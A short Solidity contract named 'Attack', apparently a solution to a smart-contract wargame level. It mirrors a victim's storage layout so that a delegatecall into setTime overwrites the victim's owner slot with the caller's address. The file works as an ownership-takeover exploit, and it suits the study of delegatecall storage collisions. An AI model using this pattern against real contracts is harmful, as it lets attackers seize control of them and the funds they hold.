// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // set the time for timezone 1
    function setTime(uint _timeStamp) public {
        owner = msg.sender;
    }
}